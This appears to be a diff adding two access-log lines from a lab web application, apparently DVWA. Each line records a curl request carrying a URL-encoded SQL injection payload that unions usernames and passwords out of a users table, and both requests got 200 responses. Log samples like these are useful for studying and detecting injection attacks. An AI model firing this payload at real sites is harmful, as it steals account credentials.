@@ -1,0 +1,2 @@
+192.168.56.30 - - [25/Nov/2026:17:03:45 -0600] "GET /vulnerabilities/sqli/?id=%27+UNION+SELECT+user%2C+password+FROM+users%23&Submit=Submit HTTP/1.1" 200 5199 "-" "curl/8.20.0"
+192.168.56.30 - - [25/Nov/2026:17:03:58 -0600] "GET /vulnerabilities/sqli/?id=%27+UNION+SELECT+user%2C+password+FROM+users%23&Submit=Submit HTTP/1.1" 200 5286 "-" "curl/8.20.0"
